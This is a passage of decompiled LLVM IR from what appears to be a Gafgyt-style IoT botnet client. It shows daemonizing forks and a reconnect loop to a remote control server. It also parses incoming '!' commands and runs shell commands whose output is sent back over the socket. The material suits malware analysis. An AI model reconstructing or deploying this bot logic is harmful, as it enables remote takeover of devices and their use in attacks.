  %v7_10efc = icmp eq i8 %v2_10ef8, 47
  br i1 %v7_10efc, label %dec_label_pc_10f04, label %dec_label_pc_10ed0

dec_label_pc_10f04:                               ; preds = %dec_label_pc_10edc
  %v2_10f14 = load i32, i32* %v1_10d68, align 4
  %v2_10f1c = add i32 %v2_10f14, %stack_var_-84.0
  %v2_10f20 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_10f20, i32* @r0, align 4
  %v8_10f34 = call i32 @sprintf(i32 %v2_10f20, i32 ptrtoint ([8 x i8]* @global_var_26450.953 to i32), i32 %v2_10ea0, i32 %v2_10f1c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_10f90 = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_10f44 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_10f70 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_10f8c.outer

dec_label_pc_10f3c:                               ; preds = %dec_label_pc_10f8c
  %v3_10f54 = call i32 @fgets(i32 %v2_10f44, i32 1024, i32 %stack_var_-88.0)
  %v3_10f70 = call i32 @__GI_strcasecmp(i8* %v2_10f70, i32 %v2_10f20)
  %v2_10f78 = icmp eq i32 %v3_10f70, 0
  br i1 %v2_10f78, label %dec_label_pc_10f80, label %dec_label_pc_10f8c

dec_label_pc_10f80:                               ; preds = %dec_label_pc_10f3c
  %v1_10f84 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_10f8c.outer

dec_label_pc_10f8c.outer:                         ; preds = %dec_label_pc_10f80, %dec_label_pc_10f04
  %stack_var_-80.0.ph = phi i32 [ %v1_10f84, %dec_label_pc_10f80 ], [ 0, %dec_label_pc_10f04 ]
  br label %dec_label_pc_10f8c

dec_label_pc_10f8c:                               ; preds = %dec_label_pc_10f8c.outer, %dec_label_pc_10f3c
  %v2_10f90 = call i32 @feof(i16* %v1_10f90)
  %v2_10f98 = icmp eq i32 %v2_10f90, 0
  br i1 %v2_10f98, label %dec_label_pc_10f3c, label %dec_label_pc_10fa0

dec_label_pc_10fa0:                               ; preds = %dec_label_pc_10f8c
  %v2_10fa4 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_10fb0 = call i32 @__GI_fclose(i16* %v1_10f90)
  br i1 %v2_10fa4, label %dec_label_pc_10fac, label %dec_label_pc_11004

dec_label_pc_10fac:                               ; preds = %dec_label_pc_10fa0
  %v4_10fb4 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_10fb4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_26458.955 to i32), i32* @r1, align 4
  %v3_10fbc = call i32 @__GI_fopen(i32 %v4_10fb4, i32 ptrtoint (i32* @global_var_26458.955 to i32))
  %v2_10fcc = icmp eq i32 %v3_10fbc, 0
  br i1 %v2_10fcc, label %dec_label_pc_11004, label %dec_label_pc_10fd4

dec_label_pc_10fd4:                               ; preds = %dec_label_pc_10fac
  %v2_10fe0 = call i32 @__GI_fputs(i32 %v2_10f20, i32 %v3_10fbc)
  %v1_10fe8 = inttoptr i32 %v3_10fbc to i16*
  %v2_10fe8 = call i32 @__GI_fclose(i16* %v1_10fe8)
  br label %dec_label_pc_11004

dec_label_pc_10ffc:                               ; preds = %dec_label_pc_10e74
  %v1_11000 = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_11000 = call i32 @__GI_fclose(i16* %v1_11000)
  br label %dec_label_pc_11004

dec_label_pc_11004:                               ; preds = %dec_label_pc_10fa0, %dec_label_pc_10fac, %dec_label_pc_10e68, %dec_label_pc_10fd4, %dec_label_pc_10ffc
  %v0_11004 = call i32 @getOurIP()
  store i32 %v0_11004, i32* @r0, align 4
  %v0_11008 = call i32 @__libc_fork()
  store i32 %v0_11008, i32* @r0, align 4
  %v2_11018 = icmp eq i32 %v0_11008, 0
  br i1 %v2_11018, label %dec_label_pc_11048, label %dec_label_pc_11084

dec_label_pc_11048:                               ; preds = %dec_label_pc_11004
  %v0_11048 = call i32 @__libc_fork()
  store i32 %v0_11048, i32* @r0, align 4
  %v2_11058 = icmp eq i32 %v0_11048, 0
  br i1 %v2_11058, label %dec_label_pc_11068.thread, label %dec_label_pc_11074

dec_label_pc_11068.thread:                        ; preds = %dec_label_pc_11048
  br label %dec_label_pc_11090

dec_label_pc_11074:                               ; preds = %dec_label_pc_11048
  %v1_11064 = call i32 @__GI_exit(i32 0)
  %v2_1107c = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_2645c.957 to i32))
  store i32 %v2_1107c, i32* @r0, align 4
  br label %dec_label_pc_11090

dec_label_pc_11084:                               ; preds = %dec_label_pc_11004
  %v2_11020 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v0_11008, i32* @r0, align 4
  store i32 %v2_11020, i32* @r1, align 4
  %v3_11030 = call i32 @__libc_waitpid(i32 %v0_11008, i32 %v2_11020, i32 0)
  %v1_11038 = call i32 @__GI_exit(i32 0)
  %v2_1108c = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_2645c.957 to i32))
  store i32 %v2_1108c, i32* @r0, align 4
  br label %dec_label_pc_11090

dec_label_pc_11090:                               ; preds = %dec_label_pc_11068.thread, %dec_label_pc_11074, %dec_label_pc_11084
  %v0_11090 = call i32 @__GI_setsid()
  %v1_11098 = call i32 @chdir(i32 ptrtoint (i32* @global_var_2644c.951 to i32))
  %v2_110a4 = call i32 @bsd_signal(i32 13, i32 1)
  %v2_11938 = ptrtoint i32* %stack_var_-5744 to i32
  %v4_11948 = bitcast i32* %stack_var_-5744 to i8*
  %v2_116a4 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_116b4 = bitcast i32* %stack_var_-1648 to i8*
  %v1_11534 = or i32 %v2_11938, 1
  %v5_11538 = inttoptr i32 %v1_11534 to i8*
  %v2_11808 = add i32 %v19_10d20, -600
  br label %dec_label_pc_110a8.outer

dec_label_pc_110a8.outer:                         ; preds = %dec_label_pc_1148c, %dec_label_pc_11928, %dec_label_pc_11090
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_11090 ], [ %stack_var_-96.2.ph, %dec_label_pc_11928 ], [ %v1_11490, %dec_label_pc_1148c ]
  %v0_110a824 = call i32 @initConnection()
  %v2_110b026 = icmp eq i32 %v0_110a824, 0
  br i1 %v2_110b026, label %dec_label_pc_110c4, label %dec_label_pc_110b8

dec_label_pc_110b8:                               ; preds = %dec_label_pc_110a8.outer, %dec_label_pc_110b8
  %v1_110bc = call i32 @sleep(i32 30)
  %v0_110a8 = call i32 @initConnection()
  %v2_110b0 = icmp eq i32 %v0_110a8, 0
  br i1 %v2_110b0, label %dec_label_pc_110c4, label %dec_label_pc_110b8

dec_label_pc_110c4:                               ; preds = %dec_label_pc_110b8, %dec_label_pc_110a8.outer
  %v2_110c8 = load i32, i32* @global_var_28570.50, align 4
  store i32 %v2_110c8, i32* @r4, align 4
  %v0_110cc = call i32 @getBuild()
  store i32 %v0_110cc, i32* @r5, align 4
  %v2_110d8 = load i32, i32* @global_var_2e7cc.314, align 4
  store i32 %v2_110d8, i32* @r0, align 4
  %v1_110dc = call i32 @__GI_inet_ntoa(i32 %v2_110d8)
  %v0_110e4 = load i32, i32* @r4, align 4
  %v0_110ec = load i32, i32* @r5, align 4
  store i32 %v0_110ec, i32* @r2, align 4
  %v3_110f0 = call i32 @sockprintf(i32 %v0_110e4, i32 ptrtoint ([16 x i8]* @global_var_2646c.961 to i32))
  br label %dec_label_pc_11928.outer

dec_label_pc_11114:                               ; preds = %dec_label_pc_113c8, %dec_label_pc_11374
  %v3_11118 = mul i32 %v3_113bc, 4
  %v2_11124 = load i32, i32* @global_var_2e7d8.71, align 4
  %v2_11128 = add i32 %v2_11124, %v3_11118
  %v1_1112c = inttoptr i32 %v2_11128 to i32*
  %v2_1112c = load i32, i32* %v1_1112c, align 4
  store i32 %v2_1112c, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  %v3_1113c = call i32 @__libc_waitpid(i32 %v2_1112c, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_1113c, 1
  br i1 %tmp111, label %dec_label_pc_11368, label %dec_label_pc_111a0

dec_label_pc_1115c:                               ; preds = %dec_label_pc_111fc, %dec_label_pc_111a0
  %v2_11160 = load i32, i32* @global_var_2e7d8.71, align 4
  %v3_1116c = mul i32 %v1_11150, 4
  %v1_11164 = add i32 %v3_1116c, -4
  %v2_11170 = add i32 %v1_11164, %v2_11160
  %v2_11188 = add i32 %v2_11160, %v3_1116c
  %v1_1118c = inttoptr i32 %v2_11188 to i32*
  %v2_1118c = load i32, i32* %v1_1118c, align 4
  %v2_11190 = inttoptr i32 %v2_11170 to i32*
  store i32 %v2_1118c, i32* %v2_11190, align 4
  br label %dec_label_pc_111a0

dec_label_pc_111a0:                               ; preds = %dec_label_pc_11114, %dec_label_pc_1115c
  %v3_1114c.sink = phi i32 [ %v1_11150, %dec_label_pc_1115c ], [ %v3_113bc, %dec_label_pc_11114 ]
  %v1_11150 = add i32 %v3_1114c.sink, 1
  %v2_111bc = load i32, i32* @global_var_28578.68, align 4
  %v5_111bc = load i32, i32* @global_var_2857c.69, align 4
  %tmp112 = icmp ugt i32 %v5_111bc, %v1_11150
  br i1 %tmp112, label %dec_label_pc_1115c, label %dec_label_pc_111e4

dec_label_pc_111e4:                               ; preds = %dec_label_pc_111a0
  %v9_111f4 = icmp eq i32 %v5_111bc, %v1_11150
  br i1 %v9_111f4, label %dec_label_pc_111fc, label %dec_label_pc_11214

dec_label_pc_111fc:                               ; preds = %dec_label_pc_111e4
  %v9_1120c = icmp eq i32 %v2_111bc, 0
  br i1 %v9_1120c, label %dec_label_pc_11214, label %dec_label_pc_1115c

dec_label_pc_11214:                               ; preds = %dec_label_pc_111fc, %dec_label_pc_111e4
  %v2_11218 = load i32, i32* @global_var_2e7d8.71, align 4
  %v3_11224 = mul i32 %v1_11150, 4
  %v1_1121c = add i32 %v3_11224, -4
  %v2_11228 = add i32 %v1_1121c, %v2_11218
  %v2_11230 = inttoptr i32 %v2_11228 to i32*
  store i32 0, i32* %v2_11230, align 4
  %v2_11238 = load i32, i32* @global_var_28578.68, align 4
  %v5_11238 = load i32, i32* @global_var_2857c.69, align 4
  %v2_11244 = add i32 %v2_11238, -1
  %v3_11244 = icmp ne i32 %v2_11238, 0
  %v3_11248 = add i32 %v5_11238, -1
  %v4_11248 = zext i1 %v3_11244 to i32
  %v5_11248 = add i32 %v3_11248, %v4_11248
  store i32 %v2_11244, i32* @global_var_28578.68, align 4
  store i32 %v5_11248, i32* @global_var_2857c.69, align 4
  %v3_11264 = icmp eq i32 %v2_11238, 0
  %v4_11268 = zext i1 %v3_11264 to i32
  %v5_11268 = add i32 %v5_11248, %v4_11268
  %v3_1126c = udiv i32 %v2_11238, 1073741824
  %v3_11270 = mul i32 %v5_11268, 4
  %v2_11274 = or i32 %v3_11270, %v3_1126c
  store i32 %v2_11274, i32* @r4, align 4
  %v3_11278 = mul i32 %v2_11238, 4
  %v1_11280 = call i32 @malloc(i32 %v3_11278)
  br label %dec_label_pc_112d8

dec_label_pc_11298:                               ; preds = %dec_label_pc_11334, %dec_label_pc_112d8
  %v3_1129c = mul i32 %v3_11328, 4
  %v2_112a8 = add i32 %v3_1129c, %v1_11280
  %v2_112bc = load i32, i32* @global_var_2e7d8.71, align 4
  %v2_112c0 = add i32 %v2_112bc, %v3_1129c
  %v1_112c4 = inttoptr i32 %v2_112c0 to i32*
  %v2_112c4 = load i32, i32* %v1_112c4, align 4
  %v2_112c8 = inttoptr i32 %v2_112a8 to i32*
  store i32 %v2_112c4, i32* %v2_112c8, align 4
  %v1_112d0 = add i32 %v3_11328, 1
  br label %dec_label_pc_112d8

dec_label_pc_112d8:                               ; preds = %dec_label_pc_11214, %dec_label_pc_11298
  %v3_11328 = phi i32 [ 0, %dec_label_pc_11214 ], [ %v1_112d0, %dec_label_pc_11298 ]
  %v2_112f4 = load i32, i32* @global_var_28578.68, align 4
  %v5_112f4 = load i32, i32* @global_var_2857c.69, align 4
  %tmp114 = icmp ugt i32 %v5_112f4, %v3_11328
  br i1 %tmp114, label %dec_label_pc_11298, label %dec_label_pc_1131c

dec_label_pc_1131c:                               ; preds = %dec_label_pc_112d8
  %v9_1132c = icmp eq i32 %v5_112f4, %v3_11328
  br i1 %v9_1132c, label %dec_label_pc_11334, label %dec_label_pc_1134c

dec_label_pc_11334:                               ; preds = %dec_label_pc_1131c
  %v9_11344 = icmp eq i32 %v2_112f4, 0
  br i1 %v9_11344, label %dec_label_pc_1134c, label %dec_label_pc_11298

dec_label_pc_1134c:                               ; preds = %dec_label_pc_11334, %dec_label_pc_1131c
  %v2_11350 = load i32, i32* @global_var_2e7d8.71, align 4
  store i32 %v2_11350, i32* @r0, align 4
  %v0_11358 = call i32 @free()
  store i32 %v1_11280, i32* @global_var_2e7d8.71, align 4
  br label %dec_label_pc_11368

dec_label_pc_11368:                               ; preds = %dec_label_pc_11114, %dec_label_pc_1134c
  %v1_1136c = add i32 %v3_113bc, 1
  br label %dec_label_pc_11374

dec_label_pc_11374:                               ; preds = %dec_label_pc_11928, %dec_label_pc_11368
  %v3_113bc = phi i32 [ %v1_1136c, %dec_label_pc_11368 ], [ 0, %dec_label_pc_11928 ]
  %v3_1137c = ashr i32 %v3_113bc, 31
  %v2_1138c = load i32, i32* @global_var_28578.68, align 4
  %v5_1138c = load i32, i32* @global_var_2857c.69, align 4
  %v3_113a8 = icmp uge i32 %v5_1138c, %v3_113bc
  %v9_113a8 = icmp eq i32 %v5_1138c, %v3_113bc
  %v2_113ac = xor i1 %v9_113a8, true
  %v3_113ac = and i1 %v3_113a8, %v2_113ac
  br i1 %v3_113ac, label %dec_label_pc_11114, label %dec_label_pc_113b0

dec_label_pc_113b0:                               ; preds = %dec_label_pc_11374
  br i1 %v9_113a8, label %dec_label_pc_113c8, label %dec_label_pc_113e0

dec_label_pc_113c8:                               ; preds = %dec_label_pc_113b0
  %tmp = icmp ugt i32 %v2_1138c, %v3_1137c
  br i1 %tmp, label %dec_label_pc_11114, label %dec_label_pc_113e0

dec_label_pc_113e0:                               ; preds = %dec_label_pc_113b0, %dec_label_pc_113c8
  %v2_113f4 = add i32 %v5_11948, %v2_11938
  %v3_113fc = inttoptr i32 %v2_113f4 to i8*
  store i8 0, i8* %v3_113fc, align 1
  %v2_11410 = call i32 @trim(i8* %v4_11948)
  %v4_11428 = call i32 @strstr(i32 %v2_11938, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1df24.52, i32 0, i32 0))
  store i32 %v4_11428, i32* @r2, align 4
  %v9_1143c = icmp eq i32 %v4_11428, %v2_11938
  br i1 %v9_1143c, label %dec_label_pc_11444, label %dec_label_pc_1145c

dec_label_pc_11444:                               ; preds = %dec_label_pc_113e0
  %v2_11448 = load i32, i32* @global_var_28570.50, align 4
  %v3_11454 = call i32 @sockprintf(i32 %v2_11448, i32 ptrtoint ([5 x i8]* @global_var_2647c.966 to i32))
  br label %dec_label_pc_11928

dec_label_pc_1145c:                               ; preds = %dec_label_pc_113e0
  %v6_11470 = call i32 @strstr(i32 %v2_11938, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_26484.968, i32 0, i32 0))
  %v9_11484 = icmp eq i32 %v6_11470, %v2_11938
  br i1 %v9_11484, label %dec_label_pc_1148c, label %dec_label_pc_114b8

dec_label_pc_1148c:                               ; preds = %dec_label_pc_1145c
  %v1_11490 = add i32 %stack_var_-96.2.ph, 1
  %v2_114a0 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_26488.970 to i32))
  %v7_114ac = icmp slt i32 %v1_11490, 21
  br i1 %v7_114ac, label %dec_label_pc_110a8.outer, label %dec_label_pc_114b0

dec_label_pc_114b0:                               ; preds = %dec_label_pc_1148c
  %v1_114b4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_114b8

dec_label_pc_114b8:                               ; preds = %dec_label_pc_1145c, %dec_label_pc_114b0
  %stack_var_-96.1 = phi i32 [ %v1_11490, %dec_label_pc_114b0 ], [ %stack_var_-96.2.ph, %dec_label_pc_1145c ]
  %v2_114cc = load i8, i8* %v4_11948, align 4
  %v7_114d0 = icmp eq i8 %v2_114cc, 33
  br i1 %v7_114d0, label %dec_label_pc_114f4, label %dec_label_pc_11928.outer

dec_label_pc_114f4:                               ; preds = %dec_label_pc_114b8, %dec_label_pc_11504
  %v3_114d8.sink = phi i8* [ %storemerge8, %dec_label_pc_11504 ], [ %v4_11948, %dec_label_pc_114b8 ]
  %v4_114d8 = ptrtoint i8* %v3_114d8.sink to i32
  %v1_114dc = add i32 %v4_114d8, 1
  %storemerge8 = inttoptr i32 %v1_114dc to i8*
  %v2_114f8 = load i8, i8* %storemerge8, align 1
  %v7_114fc = icmp eq i8 %v2_114f8, 32
  br i1 %v7_114fc, label %dec_label_pc_11514, label %dec_label_pc_11504

dec_label_pc_11504:                               ; preds = %dec_label_pc_114f4
  %v2_11508 = load i8, i8* %storemerge8, align 1
  %v2_1150c = icmp eq i8 %v2_11508, 0
  br i1 %v2_1150c, label %dec_label_pc_11514, label %dec_label_pc_114f4

dec_label_pc_11514:                               ; preds = %dec_label_pc_11504, %dec_label_pc_114f4
  %v2_11518 = load i8, i8* %storemerge8, align 1
  %v2_1151c = icmp eq i8 %v2_11518, 0
  br i1 %v2_1151c, label %dec_label_pc_11928.outer, label %dec_label_pc_11524

dec_label_pc_11524:                               ; preds = %dec_label_pc_11514
  store i8 0, i8* %storemerge8, align 1
  %v3_11544 = call i32 @strlen(i8* %v5_11538)
  %v2_11554 = add i32 %v3_11544, %v2_11938
  %v1_11558 = add i32 %v2_11554, 2
  %v5_1155c = inttoptr i32 %v1_11558 to i8*
  %v1_1158c = add i32 %v2_11554, 1
  br label %dec_label_pc_11588

dec_label_pc_11564:                               ; preds = %dec_label_pc_115b0, %dec_label_pc_11588
  %v3_11574 = call i32 @strlen(i8* %v5_1155c)
  %v2_1157c = add i32 %v1_1158c, %v3_11574
  %v3_11584 = inttoptr i32 %v2_1157c to i8*
  store i8 0, i8* %v3_11584, align 1
  br label %dec_label_pc_11588

dec_label_pc_11588:                               ; preds = %dec_label_pc_11524, %dec_label_pc_11564
  %v3_11598 = call i32 @strlen(i8* %v5_1155c)
  %v2_115a0 = add i32 %v1_1158c, %v3_11598
  %v1_115a4 = inttoptr i32 %v2_115a0 to i8*
  %v2_115a4 = load i8, i8* %v1_115a4, align 1
  %v7_115a8 = icmp eq i8 %v2_115a4, 10
  br i1 %v7_115a8, label %dec_label_pc_11564, label %dec_label_pc_115b0

dec_label_pc_115b0:                               ; preds = %dec_label_pc_11588
  store i32 %v1_1158c, i32* @r4, align 4
  %v3_115c0 = call i32 @strlen(i8* %v5_1155c)
  %v0_115c8 = load i32, i32* @r4, align 4
  %v2_115c8 = add i32 %v0_115c8, %v3_115c0
  %v1_115cc = inttoptr i32 %v2_115c8 to i8*
  %v2_115cc = load i8, i8* %v1_115cc, align 1
  %v7_115d0 = icmp eq i8 %v2_115cc, 13
  br i1 %v7_115d0, label %dec_label_pc_11564, label %dec_label_pc_115d8

dec_label_pc_115d8:                               ; preds = %dec_label_pc_115b0
  %v2_115f428 = load i8, i8* %v5_1155c, align 1
  %v7_115f832 = icmp eq i8 %v2_115f428, 32
  br i1 %v7_115f832, label %dec_label_pc_11610, label %dec_label_pc_11600

dec_label_pc_115e4:                               ; preds = %dec_label_pc_11600
  %v1_115e8 = add i32 %v4_115f034, 1
  %v5_115ec = inttoptr i32 %v1_115e8 to i8*
  %v2_115f4 = load i8, i8* %v5_115ec, align 1
  %v7_115f8 = icmp eq i8 %v2_115f4, 32
  br i1 %v7_115f8, label %dec_label_pc_11610, label %dec_label_pc_11600

dec_label_pc_11600:                               ; preds = %dec_label_pc_115d8, %dec_label_pc_115e4
  %v4_115f034 = phi i32 [ %v1_115e8, %dec_label_pc_115e4 ], [ %v1_11558, %dec_label_pc_115d8 ]
  %stack_var_-64.033 = phi i8* [ %v5_115ec, %dec_label_pc_115e4 ], [ %v5_1155c, %dec_label_pc_115d8 ]
  %v2_11604 = load i8, i8* %stack_var_-64.033, align 1
  %v2_11608 = icmp eq i8 %v2_11604, 0
  br i1 %v2_11608, label %dec_label_pc_11610, label %dec_label_pc_115e4

dec_label_pc_11610:                               ; preds = %dec_label_pc_115e4, %dec_label_pc_11600, %dec_label_pc_115d8
  %stack_var_-64.0.lcssa = phi i8* [ %v5_1155c, %dec_label_pc_115d8 ], [ %v5_115ec, %dec_label_pc_115e4 ], [ %stack_var_-64.033, %dec_label_pc_11600 ]
  %v4_115f0.lcssa = phi i32 [ %v1_11558, %dec_label_pc_115d8 ], [ %v1_115e8, %dec_label_pc_115e4 ], [ %v4_115f034, %dec_label_pc_11600 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_11620 = add i32 %v4_115f0.lcssa, 1
  %v2_1166439 = load i8, i8* %v5_1155c, align 1
  %v2_1166841 = icmp eq i8 %v2_1166439, 0
  br i1 %v2_1166841, label %dec_label_pc_11670, label %dec_label_pc_11634

dec_label_pc_11634:                               ; preds = %dec_label_pc_11610, %dec_label_pc_11634
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_11634 ], [ %v5_1155c, %dec_label_pc_11610 ]
  %storemerge1442 = phi i32 [ %v1_11658, %dec_label_pc_11634 ], [ %v1_11558, %dec_label_pc_11610 ]
  %v2_11638 = load i8, i8* %storemerge743, align 1
  %v3_11638 = zext i8 %v2_11638 to i32
  %v1_11640 = call i32 @__GI_toupper(i32 %v3_11638)
  %v1_11650 = trunc i32 %v1_11640 to i8
  store i8 %v1_11650, i8* %storemerge743, align 1
  %v1_11658 = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_11658 to i8*
  %v2_11664 = load i8, i8* %storemerge7, align 1
  %v2_11668 = icmp eq i8 %v2_11664, 0
  br i1 %v2_11668, label %dec_label_pc_11670, label %dec_label_pc_11634

dec_label_pc_11670:                               ; preds = %dec_label_pc_11634, %dec_label_pc_11610
  store i32 ptrtoint ([3 x i8]* @global_var_2649c.972 to i32), i32* @r1, align 4
  %v4_1167c = call i32 @__GI_strcoll(i8* %v5_1155c, i32 ptrtoint ([3 x i8]* @global_var_2649c.972 to i32))
  store i32 %v4_1167c, i32* @r0, align 4
  %v2_11684 = icmp eq i32 %v4_1167c, 0
  br i1 %v2_11684, label %dec_label_pc_1168c, label %dec_label_pc_11794

dec_label_pc_1168c:                               ; preds = %dec_label_pc_11670
  %v0_1168c = call i32 @listFork()
  %v2_11694 = icmp eq i32 %v0_1168c, 0
  br i1 %v2_11694, label %dec_label_pc_1169c, label %dec_label_pc_11928.outer

dec_label_pc_1169c:                               ; preds = %dec_label_pc_1168c
  store i32 1024, i32* @r2, align 4
  %v3_116b4 = call i32 @__GI_memset(i8* %v2_116b4, i32 0)
  %v6_116d4 = call i32 @szprintf(i32 %v2_116a4, i32 ptrtoint ([8 x i8]* @global_var_264a0.974 to i32), i32 %v1_11620, i32 %v2_116a4, i32 ptrtoint (i32* @0 to i32))
  %v3_116f0 = call i32 @fdpopen(i32 %v2_116a4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_26438.947, i32 0, i32 0))
  br label %dec_label_pc_1175c

dec_label_pc_11700:                               ; preds = %dec_label_pc_1175c
  %v2_11710 = call i32 @trim(i8* %v2_116b4)
  %v2_11718 = load i32, i32* @global_var_28570.50, align 4
  store i32 %v2_116a4, i32* @r2, align 4
  %v3_11734 = call i32 @sockprintf(i32 %v2_11718, i32 ptrtoint ([3 x i8]* @global_var_264a8.976 to i32))
  store i32 1024, i32* @r2, align 4
  %v3_11750 = call i32 @__GI_memset(i8* %v2_116b4, i32 0)
  %v1_11758 = call i32 @sleep(i32 1)
  br label %dec_label_pc_1175c

dec_label_pc_1175c:                               ; preds = %dec_label_pc_1169c, %dec_label_pc_11700
  %v4_11774 = call i32 @fdgets(i32 %v2_116a4, i32 1024, i32 %v3_116f0, i32 %v2_116a4)
  %v2_1177c = icmp eq i32 %v4_11774, 0
  br i1 %v2_1177c, label %dec_label_pc_11784, label %dec_label_pc_11700

dec_label_pc_11784:                               ; preds = %dec_label_pc_1175c
  %v1_11788 = call i32 @fdpclose(i32 %v3_116f0)
  %v1_11790 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11794

dec_label_pc_11794:                               ; preds = %dec_label_pc_11670, %dec_label_pc_11784
  store i32 %v1_11620, i32* @r0, align 4
  %v2_117a8 = call i32 @__GI_strtok(i32 %v1_11620, i32 ptrtoint (i32* @global_var_264ac.978 to i32))
  store i32 %v1_11558, i32* %stack_var_-624, align 4
  %v2_118ac46 = icmp eq i32 %v2_117a8, 0
  br i1 %v2_118ac46, label %dec_label_pc_118b4, label %dec_label_pc_117c0

dec_label_pc_117c0:                               ; preds = %dec_label_pc_11794, %dec_label_pc_11894
  %stack_var_-36.049.in = phi i32 [ %v2_1189c, %dec_label_pc_11894 ], [ %v2_117a8, %dec_label_pc_11794 ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_11894 ], [ 1, %dec_label_pc_11794 ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_117c4 = load i8, i8* %stack_var_-36.049, align 1
  %v7_117c8 = icmp eq i8 %v2_117c4, 10
  br i1 %v7_117c8, label %dec_label_pc_11894, label %dec_label_pc_117d0

dec_label_pc_117d0:                               ; preds = %dec_label_pc_117c0
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_117dc = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_117e4 = add i32 %v3_117dc, 1
  %v1_117ec = call i32 @malloc(i32 %v1_117e4)
  %v0_11800 = load i32, i32* @r4, align 4
  %v3_11800 = mul i32 %v0_11800, 4
  %v2_1180c = add i32 %v2_11808, %v3_11800
  %v2_11810 = inttoptr i32 %v2_1180c to i32*
  store i32 %v1_117ec, i32* %v2_11810, align 4
  %v3_11820 = mul i32 %stack_var_-40.147, 4
  %v2_11828 = add i32 %v3_11820, %v19_10d20
  %v2_1182c = add i32 %v2_11828, -600
  %v1_11830 = inttoptr i32 %v2_1182c to i32*
  %v2_11830 = load i32, i32* %v1_11830, align 4
  store i32 %v2_11830, i32* @r4, align 4
  %v3_1183c = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_11844 = add i32 %v3_1183c, 1
  %v0_11848 = load i32, i32* @r4, align 4
  store i32 %v1_11844, i32* @r2, align 4
  %v2_11854 = inttoptr i32 %v0_11848 to i8*
  %v3_11854 = call i32 @__GI_memset(i8* %v2_11854, i32 0)
  %v2_11874 = load i32, i32* %v1_11830, align 4
  store i32 %stack_var_-36.049.in, i32* @r1, align 4
  %v3_11884 = inttoptr i32 %v2_11874 to i8*
  %v4_11884 = call i32 @strcpy(i8* %v3_11884, i32 %stack_var_-36.049.in)
  %v1_1188c = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_11894

dec_label_pc_11894:                               ; preds = %dec_label_pc_117c0, %dec_label_pc_117d0
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_117c0 ], [ %v1_1188c, %dec_label_pc_117d0 ]
  store i32 0, i32* @r0, align 4
  %v2_1189c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_264ac.978 to i32))
  %v2_118ac = icmp eq i32 %v2_1189c, 0
  br i1 %v2_118ac, label %dec_label_pc_118b4, label %dec_label_pc_117c0

dec_label_pc_118b4:                               ; preds = %dec_label_pc_11894, %dec_label_pc_11794
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_11794 ], [ %stack_var_-40.0, %dec_label_pc_11894 ]
  %v3_118c0 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_118cc = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_118cc, label %dec_label_pc_11928.outer, label %dec_label_pc_118e4.lr.ph

dec_label_pc_118e4.lr.ph:                         ; preds = %dec_label_pc_118b4
  br label %dec_label_pc_118e4

dec_label_pc_118e4:                               ; preds = %dec_label_pc_118e4.lr.ph, %dec_label_pc_118e4
  %storemerge15128 = phi i32 [ 1, %dec_label_pc_118e4.lr.ph ], [ %v1_11910, %dec_label_pc_118e4 ]
  %v3_118f0 = mul i32 %storemerge15128, 4
  %v2_118f8 = add i32 %v3_118f0, %v19_10d20
  %v2_118fc = add i32 %v2_118f8, -600
  %v1_11900 = inttoptr i32 %v2_118fc to i32*
  %v2_11900 = load i32, i32* %v1_11900, align 4
  store i32 %v2_11900, i32* @r0, align 4
  %v0_11908 = call i32 @free()
  %v1_11910 = add nuw nsw i32 %storemerge15128, 1
  %v5_11924 = icmp slt i32 %v1_11910, %stack_var_-40.1.lcssa
  br i1 %v5_11924, label %dec_label_pc_118e4, label %dec_label_pc_11928.outer

dec_label_pc_11928.outer:                         ; preds = %dec_label_pc_118e4, %dec_label_pc_114b8, %dec_label_pc_1168c, %dec_label_pc_118b4, %dec_label_pc_11514, %dec_label_pc_110c4
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_110c4 ], [ %stack_var_-96.1, %dec_label_pc_11514 ], [ %stack_var_-96.1, %dec_label_pc_118b4 ], [ %stack_var_-96.1, %dec_label_pc_1168c ], [ %stack_var_-96.1, %dec_label_pc_114b8 ], [ %stack_var_-96.1, %dec_label_pc_118e4 ]
  br label %dec_label_pc_11928

dec_label_pc_11928:                               ; preds = %dec_label_pc_11928.outer, %dec_label_pc_11444
